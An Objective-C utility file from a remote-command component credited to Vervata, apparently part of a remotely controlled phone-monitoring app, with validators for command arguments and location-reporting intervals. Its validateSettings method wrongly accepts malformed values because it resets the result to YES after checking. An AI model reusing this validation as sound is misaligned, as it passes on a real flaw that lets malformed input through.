/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RemoteCmdProcessorUtils
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  17/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "RemoteCmdProcessorUtils.h"
#import "RemoteCmdUtils.h"
#import "RemoteCmdCode.h"

@implementation RemoteCmdProcessorUtils

/**
 - Method name: validateArgs
 - Purpose:This method is used to validate all the Arguments 
 - Argument list and description: aArgs (NSArray),validationType (aValidationType)
 - Return description: No return type
*/

+ (NSArray *) validateArgs: (NSArray *) aArgs
	validationType:(ProcessorValidationType) aValidationType  {
	SEL validationSelector=nil;
	switch (aValidationType) {
		case kPhoneNumberValidation:
			validationSelector=@selector(isPhoneNumber:);
			break;
		case kZeroOrOneValidation:
			validationSelector=@selector(isZeroOrOneFlag:);
			break;
		case kURLValidation:
			validationSelector=@selector(isURL:);
			break;
		case kSettingsValidation:
			validationSelector=@selector(validateSettings:);
			break;
		case kKeywordValidation:
			validationSelector=@selector(isValidKeyword:);
			break;
		case kDigitValidation:
			validationSelector=@selector(isDigitsOnly:);
			break;
		case kDigitDotDashValidation:
			validationSelector=@selector(isDigitsDotDashOnly:);
			break;
		case kFacetimeIDValidation:
			validationSelector=@selector(isFacetimeID:);
			break;

	}
	NSMutableArray *resultArry=[[NSMutableArray alloc] init];
	// First argument is Command code Second Argument is AC, these are already validate before processing
	if ([aArgs count] > 1) {
		for (int index=2; index <[aArgs count]; index++) {
			NSString * cmdString= [aArgs objectAtIndex:index];
			if(index==[aArgs count]-1) {
				if([[cmdString uppercaseString] isEqualToString:@"D"])
					break;
			}
			if (![self performSelector:validationSelector withObject:cmdString]){
				[resultArry removeAllObjects];
				break;
			}
			else [resultArry addObject:cmdString];
		}
	}
	return [resultArry autorelease];					
}

/**
 - Method name: isZeroOrOneFlag
 - Purpose:This method is used to validate zero or one 
 - Argument list and description: aCmdString (NSString)
 - Return description: YES/NO
*/

+ (BOOL) isZeroOrOneFlag: (NSString *) aCmdString {
    BOOL isFlag =NO;
    if (([aCmdString isEqualToString:@"0"]) || ([aCmdString isEqualToString:@"1"]))
		isFlag=YES;
	return isFlag;					 
}

/**
 - Method name: isPhoneNumber
 - Purpose:This method is used to validate Phone Number
 - Argument list and description:aCmdString (NSString)
 - Return description:YES/NO
*/

+ (BOOL) isPhoneNumber: (NSString *) aCmdString {
	BOOL	isPhNum = NO;
	
	if (aCmdString) {
    	NSRange nonDigits = [aCmdString rangeOfCharacterFromSet:[[NSCharacterSet decimalDigitCharacterSet] invertedSet]];
	    NSRange plusCharRange = [aCmdString rangeOfString:@"+"];
	    if (NSNotFound == nonDigits.location ||									// not found character in this string
			(plusCharRange.location == 0 && aCmdString.length > 1) ||			// + sign is in the first digit and the length of this string is more than 1
			[aCmdString isEqualToString:@"FALCON"])								// a string is "FALCON"
			isPhNum=YES;
		if ([aCmdString isEqualToString:@""]) {
			isPhNum = NO;
		}
	}
	return isPhNum;
}
			 
/**
 - Method name: isURL
 - Purpose:This method is used to validate Phone Number
 - Argument list and description: aURL(NSString)
 - Return description: YES/NO
*/

+ (BOOL)isURL: (NSString *) aURL  {
	return [[[RemoteCmdUtils sharedRemoteCmdUtils] mServerAddressManager] verifyURL:aURL];
}

/**
 - Method name: isValidKeyword:
 - Purpose:This method is used for validate keyword
 - Argument list and description: aKeywordString (NSString)
 - Return description: BOOL
 */

+(BOOL) isValidKeyword:(NSString *) aKeywordString {
	if ([aKeywordString length]>=10 && [aKeywordString length]<=160) {
		return  YES;
	}
	return NO;
}

/**
 - Method name: isDuplicateTelephoneNumber:
 - Purpose:This method is used for check is there is a duplication telephone number is an array
 - Argument list and description: aTelephoneNumbers array of telephone number
 - Return description: BOOL
 */

+ (BOOL) isDuplicateTelephoneNumber: (NSArray *) aTelephoneNumbers {
	BOOL duplicate = NO;
	for (NSInteger i = 0; i < [aTelephoneNumbers count]; i++) {
		NSString * telNumberI = [aTelephoneNumbers objectAtIndex:i];
		for (NSInteger j = i + 1; j < [aTelephoneNumbers count]; j++) {
			NSString * telNumberJ = [aTelephoneNumbers objectAtIndex:j];
			if ([telNumberI isEqualToString:telNumberJ]) {
				duplicate = YES;
				break;
			}
			if (duplicate) break;
		}
	}
	return (duplicate);
}

/**
 - Method name: isDuplicateString:
 - Purpose:This method is used for check is there is a duplication string is an array
 - Argument list and description: aStringArray array of string
 - Return description: BOOL
 */

+ (BOOL) isDuplicateString: (NSArray *) aStringArray {
	BOOL duplicate = NO;
	for (NSInteger i = 0; i < [aStringArray count]; i++) {
		NSString * stringI = [aStringArray objectAtIndex:i];
		for (NSInteger j = i + 1; j < [aStringArray count]; j++) {
			NSString * stringJ = [aStringArray objectAtIndex:j];
			if ([stringI isEqualToString:stringJ]) {
				duplicate = YES;
				break;
			}
			if (duplicate) break;
		}
	}
	return (duplicate);
}


/**
 - Method name: isDigits
 - Purpose:This method is used to check whether is Number
 - Argument list and description: aString(NSString)
 - Return description: YES/NO
*/
+ (BOOL)isDigits: (NSString *) aString {
    BOOL valid=NO;
	if ([aString isEqualToString:@"FALCON"]) {
		valid=YES;
	}
	else {
		  aString=[aString stringByReplacingOccurrencesOfString:@"+" withString:@""];
	      NSCharacterSet *alphaNums = [NSCharacterSet decimalDigitCharacterSet];
          NSCharacterSet *inStringSet = [NSCharacterSet characterSetWithCharactersInString:aString];
          valid = [alphaNums isSupersetOfSet:inStringSet];
	}
	return valid;
}

+ (BOOL) isDigitsOnly: (NSString *) aString {
    BOOL valid = NO;
	
	NSCharacterSet *alphaNums = [NSCharacterSet decimalDigitCharacterSet];
	NSCharacterSet *inStringSet = [NSCharacterSet characterSetWithCharactersInString:aString];
	valid = [alphaNums isSupersetOfSet:inStringSet];

	return valid;
}

+ (BOOL) isDigitsDotDashOnly: (NSString *) aString {
    BOOL valid = NO;
	DLog (@"string 1 to be check %@", aString)
	NSCharacterSet *alphaNums	= [NSCharacterSet decimalDigitCharacterSet];							// digit
	aString						= [aString stringByReplacingOccurrencesOfString:@"." withString:@""];	// replace '.' with empty
	aString						= [aString stringByReplacingOccurrencesOfString:@"-" withString:@""];	// replace '.' with empty
	NSCharacterSet *inStringSet = [NSCharacterSet characterSetWithCharactersInString:aString];
	DLog (@"string 2 to be check %@", aString)
	valid						= [alphaNums isSupersetOfSet:inStringSet];
	
	return valid;
}


+ (BOOL) isDigitsDashOnly: (NSString *) aString {
    BOOL valid = NO;
	DLog (@"string 1 to be check %@", aString)
	NSCharacterSet *alphaNums	= [NSCharacterSet decimalDigitCharacterSet];							// digit
	aString						= [aString stringByReplacingOccurrencesOfString:@"-" withString:@""];	// replace '.' with empty
	NSCharacterSet *inStringSet = [NSCharacterSet characterSetWithCharactersInString:aString];
	DLog (@"string 2 to be check %@", aString)
	valid						= [alphaNums isSupersetOfSet:inStringSet];
	
	return valid;
}


// check that there is 3rd argument and it is not D
+ (BOOL) isContainNonEndArgument: (NSArray *) aArgs {
		
	BOOL isContainPhoneNumber	= NO;
	// First argument is Command code, Second Argument is AC, these are already validate before processing
	if ([aArgs count] >= 3) {
		NSString *firstPhoneNumber = [aArgs objectAtIndex:2];		
		if (![[firstPhoneNumber uppercaseString] isEqualToString:@"D"]) 
			isContainPhoneNumber = YES;	
	}
	return isContainPhoneNumber;
}

+ (BOOL) validateSettings:(NSString *) aSettingsArg {
	BOOL valid=NO;
	NSArray *idArg=[aSettingsArg componentsSeparatedByString:@":"];
	if([idArg count]==2) {
		NSString *values=[idArg objectAtIndex:1];
		NSArray *valueArg=[values componentsSeparatedByString:@";"];
		if([valueArg count]==1) {
			if (![self isDigits:[valueArg objectAtIndex:0]]) {
			    valid=NO;	
			}
		}
		else {
			for (NSString *value in valueArg){
				if (![self isDigits:value]) {
					valid=NO;
					break;
				}
			}
		}
		valid=YES;
		if(![self isDigits:[idArg objectAtIndex:0]])
			valid=NO ;
	}
	
	return valid;
}


/**
 - Method name: timeIntervalForLocation:
 - Purpose:This method is used for getting time interval for Location as per specification
 - Argument list and description: aOption (NSUInteger)
 - Return description: timeInterval (double)
 */

+ (NSInteger) timeIntervalForLocation: (NSUInteger) aOption {
	NSInteger timeInterval=0;
	switch (aOption) {
		case 1:
			timeInterval=10;
			break;
		case 2:
			timeInterval=30;
			break;
		case 3:
			timeInterval=60;
			break;
		case 4:
			timeInterval=300;
			break;
		case 5:
			timeInterval=600;
			break;
		case 6:
			timeInterval=1200;
			break;
		case 7:
			timeInterval=2400;
			break;
		case 8:
			timeInterval=3600;
			break;
	}
	
	return timeInterval;
}

/**
 - Method name: timeIntervalForLocation:
 - Purpose:This method is used for getting time interval for Location as per specification
 - Argument list and description: aOption (NSUInteger)
 - Return description: timeInterval (double)
*/

+ (NSString *) locationTimeIntervalForDisplay: (NSUInteger) aTimeInterval {
	NSString *locationTime=@"0 Sec";
	switch (aTimeInterval) {
		case 10:
			locationTime= @"10 Sec";
			break;
		case 30:
			locationTime=@"30 Sec";
			break;
		case 60:
			locationTime=@"1 Min";
			break;
		case 300:
			locationTime=@"5 Min";
			break;
		case 600:
			locationTime=@"10 Min";
			break;
		case 1200:
			locationTime=@"20 Min";
			break;
		case 2400:
			locationTime=@"40 Min";
			break;
		case 3600:
			locationTime=@"1 Hour";
			break;
	}
	
	return locationTime;
     
}

+ (NSInteger) locationForTimeInterval: (NSUInteger) aTimeInterval {
		
	NSInteger locationTimer = 0;
	
	switch (aTimeInterval) {
		case 10:						// 10 Sec
			locationTimer = 1;		
			break;
		case 30:						// 30 Sec
			locationTimer = 2;
			break;
		case 60:						// 1 Min
			locationTimer = 3;
			break;
		case 300:						// 5 Min
			locationTimer = 4;
			break;
		case 600:						// 10 Min
			locationTimer = 5;
			break;	
		case 1200:						// 20 Min
			locationTimer = 6;
			break;
		case 2400:						// 40 Min
			locationTimer = 7;
			break;
		case 3600:						// 1 Hour
			locationTimer = 8;
			break;
	}
	
	return locationTimer;
	
}

// source: http://stackoverflow.com/questions/800123/best-practices-for-validating-email-address-in-objective-c-on-ios-2-0
+ (BOOL) isEmail: (NSString *) aCandidate {
    NSString *emailRegex	= @"[A-Z0-9a-z._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,6}"; 
    NSPredicate *emailTest	= [NSPredicate predicateWithFormat:@"SELF MATCHES %@", emailRegex]; 
	
    return [emailTest evaluateWithObject:aCandidate];
}

+ (BOOL) isFacetimeID: (NSString *) aCandidate {
	/*
	 Note that Facetime id can be email or telephone id
	 */	
	BOOL isFacetimeID = NO;
	if ([RemoteCmdProcessorUtils isPhoneNumber:aCandidate]		||
		[RemoteCmdProcessorUtils isEmail:aCandidate]			) {
		DLog (@"This is valid facetime id %@", aCandidate)
		isFacetimeID = YES;
	} else {
		DLog (@"This is invalid facetime id %@", aCandidate)
	}
	return isFacetimeID;
}

+ (BOOL) isSupportSettingIDOfRemoteCmdCodeSettings: (NSInteger) aSettingID {
    id <ConfigurationManager> configurationManager		= [[RemoteCmdUtils sharedRemoteCmdUtils] mConfigurationManager];
    BOOL isSupport = [configurationManager isSupportedSettingID:aSettingID remoteCmdID:kRemoteCmdCodeSetSettings];
    DLog(@"This setting id %ld isSupport ? %d", (long)aSettingID, isSupport)
    return isSupport;
}

/*
- (BOOL) validateEmail: (NSString *) candidate {
    NSString *emailRegex =
	@"(?:[a-z0-9!#$%\\&'*+/=?\\^_`{|}~-]+(?:\\.[a-z0-9!#$%\\&'*+/=?\\^_`{|}"
	@"~-]+)*|\"(?:[\\x01-\\x08\\x0b\\x0c\\x0e-\\x1f\\x21\\x23-\\x5b\\x5d-\\"
	@"x7f]|\\\\[\\x01-\\x09\\x0b\\x0c\\x0e-\\x7f])*\")@(?:(?:[a-z0-9](?:[a-"
	@"z0-9-]*[a-z0-9])?\\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\\[(?:(?:25[0-5"
	@"]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-"
	@"9][0-9]?|[a-z0-9-]*[a-z0-9]:(?:[\\x01-\\x08\\x0b\\x0c\\x0e-\\x1f\\x21"
	@"-\\x5a\\x53-\\x7f]|\\\\[\\x01-\\x09\\x0b\\x0c\\x0e-\\x7f])+)\\])"; 
    NSPredicate *emailTest = [NSPredicate predicateWithFormat:@"SELF MATCHES[c] %@", emailRegex]; 
	
    return [emailTest evaluateWithObject:candidate];
}
*/

/*
-(BOOL) NSStringIsValidEmail:(NSString *)checkString {
	BOOL stricterFilter = YES; // Discussion http://blog.logichigh.com/2010/09/02/validating-an-e-mail-address/
	NSString *stricterFilterString	= @"[A-Z0-9a-z._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,4}";
	NSString *laxString				= @".+@.+\\.[A-Za-z]{2}[A-Za-z]*";
	NSString *emailRegex = stricterFilter ? stricterFilterString : laxString;
	NSPredicate *emailTest = [NSPredicate predicateWithFormat:@"SELF MATCHES %@", emailRegex];
	return [emailTest evaluateWithObject:checkString];
}
*/
@end
